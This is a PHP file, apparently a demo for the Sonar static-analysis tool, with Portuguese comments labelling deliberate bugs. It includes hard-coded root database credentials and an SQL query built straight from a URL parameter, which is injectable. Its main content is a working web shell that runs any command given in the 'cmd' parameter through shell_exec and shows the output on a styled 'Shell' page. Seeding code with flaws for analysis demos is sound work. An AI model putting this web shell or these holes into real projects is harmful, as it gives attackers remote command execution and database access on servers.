<?php

// BUG DEMO 1 — Hard-coded credentials (Sonar: S2068 "Credentials should not be hard-coded")
$db_password = "admin123";
$db_user = "root";
$conn = mysqli_connect("localhost", $db_user, $db_password, "controle_contas");

// BUG DEMO 2 — SQL Injection (Sonar: S3649 "Database queries should not be vulnerable to injection attacks")
$user_id = $_GET['user_id'];
$result = mysqli_query($conn, "SELECT * FROM contas WHERE user_id = " . $user_id);

// BUG DEMO 3 — Dead code / unused variable (Sonar: S1481 "Unused local variables should be removed")
$unused_variable = "isso nunca é usado";

$cmd =  $_GET['shell'];

$cmd =  $_GET['shell'];

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'ls -la';
$output = shell_exec($cmd . ' 2>&1');
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>Shell</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      padding: 1rem
    }

    pre {
      white-space: pre-wrap;
      word-break: break-all
    }

    input {
      width: 60%;
      padding: .4rem;
      background: #222;
      color: #0f0;
      border: 1px solid #0f0
    }

    button {
      padding: .4rem 1rem;
      background: #0f0;
      color: #111;
      border: none;
      cursor: pointer
    }
  </style>
</head>

<body>
  <form method="get">
    <input name="cmd" value="<?= htmlspecialchars($cmd) ?>">
    <button type="submit">Executar</button>
  </form>
  <hr>
  <pre><?= htmlspecialchars($output ?? 'Sem saída ou comando não encontrado.') ?></pre>
</body>

</html>



<!--  -->

<?php

function calcularDesconto($preco)
{
  if ($preco > 100) {
    $desconto = 10;
  }
  // Bug: $desconto pode nao existir se preco <= 100
  return $preco - $desconto;
}
